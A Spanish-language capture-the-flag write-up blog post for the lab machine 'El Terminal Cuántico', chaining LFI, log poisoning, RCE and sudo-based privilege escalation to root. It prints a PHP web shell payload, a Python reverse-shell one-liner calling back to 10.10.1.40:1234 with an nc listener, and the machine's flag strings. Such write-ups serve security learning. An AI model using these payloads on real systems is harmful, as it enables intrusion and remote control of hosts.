---
layout: post
title: "El Terminal Cuántico - Writeup"
date: 2026-02-21
tags: [Linux, Privilege Escalation, SUID, RCE, LFI]
description: "Explotación de la maquina El Terminal Cuántico de ThePwnLab"

---
## Introducción

En este CTF abordaremos vulnerabilidades como LFI, RCE y Escalada de privilegios.

## Enumeración

Enumeracion de puertos y servicios: 

```bash

nmap 10.0.0.27 sCV -T5

```
![Nmap Scan](/assets/images/cuantico/nmap.png)

Encontramos el puerto 22 para ssh y el puerto 5000 para http donde ya podremos acceder a la pagina web, analizamos como se comporta la página y revisamos en el código fuente si hay algo oculto o de lo que nos podamos aprovechar y en este caso se observa un mensaje que pone **recordemos eliminar readme.txt**


![source](/assets/images/cuantico/fuente.png)


Después de ver ese mensaje vemos que tenemos una especie de terminal en la pagina web donde podemos interactuar. A si que hacemos comprobaciones. 

![terminal](/assets/images/cuantico/terminal.png)

Al intentar buscar algún log en el sistema nos muestra que  solo se permiten buscar archivos .log y .txt

![log](/assets/images/cuantico/log.png)

así que viendo el error de antes y el comentario que esta en el código fuente de la pagina probamos a poner /tmp/readme.txt y encontramos información valiosa sobre el sistema aparte demostrando también que tenemos la vulnerabilidad LFI.

![readme](/assets/images/cuantico/readme.png)

procedemos a probar RCE para ello inyectamos el codigo de php para provocar RCE, una vez transmitimos en el mensaje, invocamos el php malicioso que hemos inyectado y podemos observar que funciona y hemos obtenido exitosamente un RCE

```bash 

<?php system($_GET['cmd']); ?>

```

![transmitir](/assets/images/cuantico/transmitir.png)


![RCE](/assets/images/cuantico/RCE.png)

Por lo tanto empezamos a navegar por el sistema y buscamos en cat /etc/passwd y vemos los usuarios del sistema
nos llama especialmente la atención el usuario elysium y dr_quantum 
probamos a mirar el directorio elysium con ls 

```bash 
ls /home/elysium
```

![flag](/assets/images/cuantico/flag.png)

vemos que tenemos la primera flag, probamos a leerlo con cat y la obtenemos.

![flag2](/assets/images/cuantico/flag2.png)

**ELYSIUM{L0g_P01s0n1ng_M4s7er_0f_L3v14th4n}**

validamos que shells tiene en /etc/shells para poder intentar hacer una revershell 


![shell](/assets/images/cuantico/shell.png)

en reverseshell generator usamos la de python3 shortest 

```bash 
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("**10.10.1.40**",**1234**));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("**sh**")' 
```

ponemos el listener a la escucha **nc -lnvp 1234** . Lo incrustamos donde el cmd y obtenemos la revershell

![elysium](/assets/images/cuantico/elysium.png)

encontramos en /var/www con ls -la una base de datos donde hay varios usuarios y probamos con elysium ya que dr.quantum no deja y conseguimos iniciar como elysium

![datos](/assets/images/cuantico/datos.png)

observamos que con sudo -l el log analyzer se ejecuta con dr_quantum 
si ponemos:
```bash
sudo -u dr_quantum /usr/local/bin/log_analyzer /tmp/test  --export
```
podremos ejecutar el script como dr.quantum. cuando nos pida poner un comando el script, ponemos /bin/bash y ascendemos a dr_quantum.

![quantum](/assets/images/cuantico/quantum.png)


si volvemos a poner **sudo -l** ahora vemos que podemos ejecutar un script que ejecuta root. si leemos el script vemos que tiene varias opciones vulnerables es decir no valida la entrada asi que en la opcion 3 podemos ejecutar comandos y opcion 4 leer archivos como root.

![script](/assets/images/cuantico/script.png)

ejecutamos el script con ***sudo /opt/quantum-backup/backup_system.py***.

para la opcion 4 podemos leer la flag de root que esta en /root/flag.txt

ROOT{Qu4ntum_D0m1n4t10n_L3v14th4n_Supr3m3}

![4](/assets/images/cuantico/4.png)

o mi preferida que seria usar la opcion 3 y poner el comando su root y ya seriamos root.

![root](/assets/images/cuantico/root.png)

Espero que os haya gustado mi primer WriteUp. 

### Redes Sociales

- **GitHub:** [Etern4lx](https://github.com/Etern4lx)
- **YouTube:** [Etern4l](https://www.youtube.com/@Etern4l1)